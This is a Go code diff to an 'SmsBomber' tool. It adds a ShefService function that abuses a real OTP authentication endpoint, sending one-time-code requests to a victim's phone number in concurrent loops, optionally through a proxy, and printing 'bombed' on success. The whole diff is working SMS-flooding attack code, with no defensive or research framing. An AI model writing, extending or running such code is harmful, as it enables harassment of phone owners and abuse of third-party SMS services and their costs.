@@ -75,7 +75,8 @@ func (b *SmsBomber) Start(count int) {
 	var wg sync.WaitGroup
 
 	for i := 0; i < count; i++ {
-		wg.Add(3)
+		wg.Add(4)
+		go b.ShefService(&wg)
 		go b.SomonService(&wg)
 		go b.AvrangService(&wg)
 		go b.DastrasService(&wg)
@@ -228,4 +229,50 @@ func (b *SmsBomber) DastrasService(wg *sync.WaitGroup) {
 		fmt.Println("bombed")
 	}
 
+}
+
+// ShefService method for attacking the Shef.tj service
+func (b *SmsBomber) ShefService(wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	URL := "https://data.shef.tj/api/auth/otp"
+	client := &http.Client{}
+	reqBody := map[string]interface{}{
+		"phone": b.PhoneNumber,
+	}
+	reqJSON, err := json.Marshal(reqBody)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(reqJSON))
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	if b.Proxy != "" {
+		proxyURL, err := url.Parse(b.Proxy)
+		if err != nil {
+			log.Println(err)
+			return
+		}
+		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	serviceName := "Shef"
+	statusCode := resp.StatusCode
+	b.Status <- ServiceStatus{ServiceName: serviceName, StatusCode: statusCode, PhoneNumber: b.PhoneNumber}
+
+	if statusCode == http.StatusOK {
+		fmt.Println("bombed")
+	}
 }
